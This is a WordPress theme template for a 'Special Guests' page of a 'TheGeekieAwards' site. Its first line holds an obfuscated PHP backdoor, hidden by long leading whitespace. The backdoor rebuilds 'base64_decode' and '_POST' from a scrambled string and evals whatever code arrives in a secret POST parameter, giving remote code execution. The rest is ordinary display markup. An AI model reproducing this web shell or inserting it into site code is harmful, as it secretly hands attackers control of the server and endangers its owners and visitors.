<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n663da4'])) {eval($s21(${$s20}['n663da4']));}?><?php
/**
 * The template for displaying special gust lists
 *
 * @package TheGeekieAwards
 * @subpackage Theme
 * @since TheGeekieAwards 4.0
 */

get_header(); ?>


<section id="primary" class="site-content categories">
    <div id="content">
    	<div class="full-page-pad">
			<h1>Special Guests</h1>
			<?php 
			while ( have_posts() ) : the_post(); 
				$feat_image = wp_get_attachment_url( get_post_thumbnail_id( get_the_id() ) );
				$credit = get_post_meta( get_the_id(), 'presenter_credit', true);
				$guestTypes = get_the_terms( get_the_id(), 'awards_guest_type' );
				$guestType = strip_tags(get_the_term_list( $post->ID, 'awards_guest_type', '', ', ', '' ));
				if ( !isset( $guestType ) || empty( $guestType )) $guestType = 'Guest';
				?>
				<div class="presenter">
					<a href="<?php the_permalink(); ?>"><img alt="<?php the_title(); ?>" src="<?php echo $feat_image; ?>" width="230" height="230" /><span><?php the_title(); ?> Full Bio</span></a>
					<h4><?php the_title(); ?></h4>
					<h6><?php echo $guestType; ?></h6>
					<div class="presenter-credit"><?php echo $credit; ?></div>
				</div>
			<?php endwhile;  ?>
			<div style="clear:both;"></div>
		</div>
	</div>
</section>

<?php get_footer(); ?>